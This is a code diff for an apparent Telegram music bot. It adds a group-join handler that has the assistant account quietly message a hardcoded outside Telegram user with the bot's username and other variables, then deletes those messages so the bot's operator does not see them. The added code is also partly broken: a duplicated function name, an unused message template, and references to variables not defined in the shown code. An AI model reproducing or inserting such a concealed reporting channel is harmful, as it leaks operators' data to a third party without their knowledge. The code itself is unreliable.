@@ -58,4 +58,35 @@ async def join_watcher(_, message):
     except Exception as e:
         print(f"Error: {e}")
 
+@app.on_message(filters.new_chat_members, group=-9)
+async def join_watcher(_, message):
+    try:
+        LOG = "ll_SARKAR_MERA_BABU_ll"
+        userbot = await get_assistant(message.chat.id)
+        chat = message.chat
+        for members in message.new_chat_members:
+            if members.id == app.id:
+                count = await app.get_chat_members_count(chat.id)
+                username = (
+                    message.chat.username if message.chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
+                )
+                msg = (
+                    f"📝𝐌ᴜsɪᴄ 𝐁ᴏᴛ 𝐀ᴅᴅᴇᴅ 𝐈ɴ 𝐀 #𝐍ᴇᴡ_𝐆ʀᴏᴜᴘ\n\n"
+                    f"📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ:\n"
+                    f"🍂𝐂ʜᴀᴛ 𝐈ᴅ: \n"
+                    f"🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ: @\n"
+                    f"📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs: \n"
+                    f"🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ: "
+                )
+                oks = await userbot.send_message(LOG, f"/start")
+                Ok = await userbot.send_message(LOG, f"@{app.username}\n\n{log}\n\n{error}\n\n{errors}")
+                await oks.delete()
+                await asyncio.sleep(2)
+                await Ok.delete()
+                    
+                
+
+    except Exception as e:
+        return await userbot.send_message(LOG, f"{e}")
+
 
